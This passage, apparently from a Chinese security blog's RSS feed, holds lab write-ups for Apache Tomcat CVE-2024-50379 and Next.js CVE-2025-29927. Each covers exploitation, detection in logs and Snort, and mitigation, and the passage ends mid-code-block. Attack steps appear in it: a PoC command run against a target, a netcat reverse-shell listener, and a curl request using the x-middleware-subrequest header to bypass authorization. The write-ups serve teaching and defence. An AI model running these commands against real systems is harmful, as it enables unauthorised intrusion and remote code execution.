+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417145126222.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250417145126222&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;接下来，在攻击机上，我们使用命令 &lt;code&gt;python3 ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py -u 10.10.211.24:8080&lt;/code&gt; 运行漏洞利用程序。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注 1：&lt;/strong&gt; 运行此命令将显示类似 &lt;code&gt;Checking http://10.10.211.24:8080/...&lt;/code&gt; 的消息，并且终端将停止显示更新几分钟。在此期间，漏洞代码会发送大量请求，导致目标服务器过载，并成功产生竞争条件。请等待脚本执行，同时观察终端运行 &lt;code&gt;netcat -lvnp 8888&lt;/code&gt; 命令的情况。耐心是关键。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注 2：&lt;/strong&gt; 由于这是一个竞争条件漏洞，您可能需要重复 PoC 多次才能成功。&lt;/p&gt;
+&lt;p&gt;当漏洞利用成功时，将与正在监听的 &lt;code&gt;netcat&lt;/code&gt; 建立连接。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417150039295.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250417150039295&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测
+&lt;/h2&gt;&lt;p&gt;由于该漏洞依赖于竞争条件成功，并且每次利用尝试都需要上传文件，因此很容易在网络访问日志中检测到（默认位于 &lt;code&gt;C:\Program Files\Apache Software Foundation\&amp;lt;Tomcat Version&amp;gt;\logs\*access_log*&lt;/code&gt; 文件中）。对文件上传不受限制的网站进行的最简单攻击将记录如下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;PUT&lt;/strong&gt; 请求上传带有大写（ &lt;strong&gt;.Jsp&lt;/strong&gt; 或 &lt;strong&gt;.JSP&lt;/strong&gt; ）扩展名的文件（ &lt;code&gt;&amp;quot;PUT /cve.Jsp&amp;quot;&lt;/code&gt; ）&lt;/li&gt;
+&lt;li&gt;紧接着向同一个文件发出 &lt;strong&gt;GET&lt;/strong&gt; 请求，但现在是向 &lt;strong&gt;.jsp&lt;/strong&gt; 扩展名发出请求（ &lt;code&gt;&amp;quot;GET /cve.jsp&amp;quot;&lt;/code&gt; ）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;GET&lt;/strong&gt; 请求将记录 &lt;strong&gt;200&lt;/strong&gt; 或 &lt;strong&gt;404&lt;/strong&gt; 状态代码，具体取决于竞争条件是否成功&lt;/li&gt;
+&lt;li&gt;重复上述步骤，直到竞争条件成功；通常需要 1000 次或更多次尝试&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:34 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;201&lt;/span&gt; -
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:34 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;409&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;654&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;204&lt;/span&gt; -
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;PUT /cve.Jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;204&lt;/span&gt; -
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;10.14.97.15 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Jan/2025:14:25:39 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /cve.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;假设目标 Web 服务器不允许通过 PUT 直接上传文件，但仍具有一些 Web 上传功能（例如图片或文件上传功能）。在这种情况下，攻击将具有类似的迭代模式：首先请求 Web 上传表单，然后请求上传的恶意 JSP 文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST /app/template-upload.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;782&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /uploads/revshell.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST /app/template-upload.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;782&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /uploads/revshell.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;749&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST /app/template-upload.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;782&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;223.199.178.14 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;31/Jan/2025:18:32:11 +0000&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET /uploads/revshell.jsp HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;系统日志&#34;&gt;系统日志
+&lt;/h3&gt;&lt;p&gt;除了基于 Web 的检测之外，还可以使用默认的 Windows 事件日志或 Sysmon 等专用工具在操作系统和文件系统级别跟踪攻击。简而言之，可以围绕以下方面构建检测：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;文件创建&lt;/strong&gt; ：上传的 JSP 文件会保留在 Web 根目录中，除非威胁参与者手动删除它们。任何名称可疑的 JSP 文件（例如 &lt;code&gt;revshell.jsp&lt;/code&gt; ）或包含 &lt;code&gt;.exec()&lt;/code&gt; 等字符串的无法识别的 JSP 文件都可能表明存在攻击。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;进程执行&lt;/strong&gt; ：上传的 JSP 文件通常需要启动子进程才能实现代码执行。在 Windows 上，如果发现 Apache Tomcat 启动了 CMD 或 PowerShell 进程，则可能是另一个可靠的攻击指标。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;缓解措施&#34;&gt;缓解措施
+&lt;/h2&gt;&lt;p&gt;务必检查是否已为 servlet 启用了 write 权限。如果默认配置保持不变，即 &lt;code&gt;readonly&lt;/code&gt; 未设置为 &lt;code&gt;false&lt;/code&gt; ，则不会受到影响。如果 readonly 已设置为 &lt;code&gt;false&lt;/code&gt; ，且您的用例不需要该权限，请将其重新设置为 &lt;code&gt;true&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;缓解措施已在&lt;a class=&#34;link&#34; href=&#34;https://lists.apache.org/thread/b2b9qrgjrz1kvo4ym8y2wkfdvwoq6qbp&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;官方公告&lt;/a&gt;中概述。用户应考虑以下两点。首先，用户应升级已安装的 Apache Tomcat。具体如下：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Apache Tomcat 11.0.0-M1 到 11.0.1 的用户应升级到 &lt;strong&gt;11.0.3&lt;/strong&gt; 或更高版本。&lt;/li&gt;
+&lt;li&gt;Apache Tomcat 10.1.0-M1 到 10.1.33 的用户应升级到 &lt;strong&gt;10.1.35&lt;/strong&gt; 或更高版本。&lt;/li&gt;
+&lt;li&gt;Apache Tomcat 9.0.0.M1 到 9.0.97 的用户应升级到 &lt;strong&gt;9.0.99&lt;/strong&gt; 或更高版本。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;对于仅升级到 11.0.2、10.1.34 或 9.98 的用户，需要执行其他步骤。特别是，旧版本 Java 的用户需要进行相关的显式更改：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在使用 Java 8 或 Java 11 的系统上，系统属性 &lt;code&gt;sun.io.useCanonCaches&lt;/code&gt; 应从默认值更改为 &lt;code&gt;false&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;在使用 Java 17 的系统上，如果系统属性 &lt;code&gt;sun.io.useCanonCaches&lt;/code&gt; 的默认值已更改，则应将其恢复为 &lt;code&gt;false&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;需要注意的是，Tomcat 11.0.3、10.1.35、9.0.99 及更高版本包含检查以确保 &lt;code&gt;sun.io.useCanonCaches&lt;/code&gt; 设置正确。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>CVE-2025-29927</title>
+        <link>https://Yerucrem.github.io/p/cve-2025-29927/</link>
+        <pubDate>Thu, 17 Apr 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/cve-2025-29927/</guid>
+        <description>&lt;h1 id=&#34;nextjs-cve-2025-29927&#34;&gt;Next.js: CVE-2025-29927
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
+&lt;/h2&gt;&lt;p&gt;Next.js 是由 Vercel 开发的 Web 开发框架，旨在简化高性能 Web 应用程序的创建。Next.js 构建于 React  之上，并通过添加多项功能（例如静态站点生成 (SSG) 和服务端渲染 (SSR)）扩展了 React 的功能。SSG  在构建时预生成页面，从而可以更快地交付给用户；此外，SSR 在请求时渲染页面，从而减少加载时间。简而言之，Next.js  添加了旨在提升性能和用户体验的功能。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2025-29927&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CVE -2025-29927&lt;/a&gt; 是 &lt;a class=&#34;link&#34; href=&#34;https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Rachid 和 Yasser Allam&lt;/a&gt; 最近在 Next.js  中发现的一个漏洞，该漏洞表明如果授权检查发生在中间件中，则有可能被绕过。中间件是授予开发人员控制传入请求的部分。它充当传入请求和路由系统之间的桥梁。路由系统是基于文件的，即通过组织文件和目录来创建和管理路由。此漏洞允许攻击者绕过基于中间件的授权，并且 14.2.25 和 15.2.3 之前的所有版本都容易受到此漏洞的影响。&lt;/p&gt;
+&lt;p&gt;Next.js 广泛应用于各种类型的应用程序，包括电商平台、新闻应用、文档网站和交互式 Web 应用。因此，此漏洞可能造成严重后果，需要管理员将其安装升级到修补版本。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h2&gt;&lt;h3 id=&#34;curl&#34;&gt;Curl
+&lt;/h3&gt;&lt;p&gt;Yunus Aydin 在 GitHub 上发布了一个概念验证 ( PoC )&lt;a class=&#34;link&#34; href=&#34;https://github.com/aydinnyunus/CVE-2025-29927&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt; 可利用的应用程序&lt;/a&gt;和漏洞代码。部署好之后可以通过访问 &lt;code&gt;http://10.10.134.123:3000&lt;/code&gt; 查看示例 Web 应用程序。但是，如果尝试访问 &lt;code&gt;http://10.10.134.123:3000/protected&lt;/code&gt; 上的受保护路由，将被重定向到主页。&lt;/p&gt;
+&lt;p&gt;利用 CVE -2025-29927 漏洞非常简单；攻击者只需在请求中添加额外的 HTTP 标头 &lt;code&gt;x-middleware-subrequest: middleware&lt;/code&gt; 即可。正如披露此漏洞的&lt;a class=&#34;link&#34; href=&#34;https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;原始帖子&lt;/a&gt;中所述，添加 &lt;code&gt;x-middleware-subrequest&lt;/code&gt; 标头会导致请求被转发到其目的地，而无需中间件对其进行操作。因此，只需使用带有适当标头参数的 &lt;code&gt;curl&lt;/code&gt; 即可访问受保护的路由（即页面）。&lt;/p&gt;
+&lt;p&gt;利用此漏洞我们可以访问受保护的页面。一个简单的方法是在终端中输入以下命令。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;x-middleware-subrequest: middleware&amp;#34;&lt;/span&gt; http://10.10.134.123:3000/protected
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;该命令与普通的 &lt;code&gt;curl&lt;/code&gt; 命令类似，但有一个区别：它使用 &lt;code&gt;-H&lt;/code&gt; 选项（相当于 &lt;code&gt;--header&lt;/code&gt; 选项）向 HTTP GET 请求添加额外的标头。因此，上述 &lt;code&gt;curl&lt;/code&gt; 命令允许攻击者绕过所有安全控制并检索受保护的页面。&lt;/p&gt;
+&lt;h3 id=&#34;burp-suite&#34;&gt;Burp Suite
+&lt;/h3&gt;&lt;p&gt;使用 Burp Suite 也同样容易利用此漏洞。一种简单的方法是使用 Burp Suite 的浏览器，并在访问 &lt;code&gt;http://10.10.134.123:3000/protected&lt;/code&gt; 时修改请求。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250417153324156.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250417153324156&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;漏洞检测&#34;&gt;漏洞检测
+&lt;/h2&gt;&lt;p&gt;回想一下前面的任务，Next.js 的 CVE -2025-29927 是一个中间件授权绕过漏洞，导致能够访问以前需要此类授权的页面和路由。&lt;/p&gt;
+&lt;p&gt;此任务将涵盖一些可用于通过日志和网络流量检测此类攻击发生的技术和规则。&lt;/p&gt;
+&lt;h3 id=&#34;手动&#34;&gt;手动
+&lt;/h3&gt;&lt;p&gt;Web 服务器日志可能有助于发现此类漏洞的证据。但这取决于 Web 服务器是否配置为记录 HTTP 标头。例如，NodeJS 允许通过 &lt;code&gt;request.headers[&#39;x-middleware-subrequest&#39;]&lt;/code&gt; 记录此特定的 HTTP 标头。&lt;/p&gt;
+&lt;p&gt;如果 Web 应用程序使用了代理，则需要修改 Web 服务器（例如 Nginx 或 Apache2）上的日志配置，以记录此特定标头。例如，可以使用 Apache2 中的 &lt;strong&gt;LogFormat&lt;/strong&gt; ：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;LogFormat &amp;#34;%h %l %u %t \&amp;#34;%r\&amp;#34; %&amp;gt;s %b \&amp;#34;%{Referer}i\&amp;#34; \&amp;#34;%{User-Agent}i\&amp;#34; \&amp;#34;%{x-middleware-subrequest}i\&amp;#34;&amp;#34; custom
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;一旦正确设置了此 HTTP 标头的日志记录，就可以使用 Grep、Yara 等常用工具。&lt;/p&gt;
+&lt;h3 id=&#34;了解snort-v2&#34;&gt;[了解]Snort (v2)
+&lt;/h3&gt;&lt;p&gt;以下 Snort 规则在用作 IDS 时可用于检测 CVE -2025-29927 的发生：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alert tcp any any -&amp;gt; any any (msg: &amp;#34;HTTP &amp;#39;x-middleware-request&amp;#39; header detected, possible CVE-2025-29927 explotation&amp;#34;; content:&amp;#34;x-middleware-subrequest&amp;#34;;  rawbytes; sid:10000001; rev:1)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;此规则检查数据包时不考虑任何协议，例如 &lt;code&gt;http_headers&lt;/code&gt; 模块。这是因为在撰写本文时， HTTP 标头“x-middleware-request”在 Snort 中尚未被&lt;a class=&#34;link&#34; href=&#34;https://docs.snort.org/rules/options/payload/http/header&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;识别 &lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;首先，我们将 Snort 规则添加到本地规则中。默认情况下，在 Ubuntu 上，它位于 &lt;code&gt;/etc/snort/rules/local.rules&lt;/code&gt; 。现在，我们将上面的代码片段粘贴并保存。请注意，如果您已有规则，则需要将 &lt;code&gt;sid&lt;/code&gt; 值更改为其他值。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kali@yrc-2404:~$ sudo nano /etc/snort/rules/local.rules
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# $Id: local.rules,v 1.11 2004/07/23 20:14:44 bmc Exp $&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ----------------&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# LOCAL RULES&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ----------------&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# This file intentionally does not come with signatures.  Put your local&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# additions here.&lt;/span&gt;
